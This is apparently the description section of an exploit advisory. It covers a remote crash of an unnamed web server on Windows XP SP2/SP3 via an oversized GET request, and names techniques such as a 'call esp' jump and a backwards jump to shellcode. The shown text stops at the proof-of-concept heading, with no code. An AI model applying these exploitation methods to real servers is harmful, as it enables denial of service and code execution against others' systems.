#1. Description

#His technique works fine against Windows XP Professional Service Pack 2 and 3 (English).
#For this exploit I have tried several strategies to increase reliability and performance:
#Jump to a static 'call esp'
#Backwards jump to code a known distance from the stack pointer.
#The server did not properly handle request with large amounts of data via method GET to web server.
#The following request sends a large amount of data to the web server to process across method GET, the server will crash as soon as it is received and processed, causing denial of service conditions.
#Successful exploitation of these issues allows remote attackers to crash the affected server, denying service to legitimate users.

#2. Proof of Concept - PoC
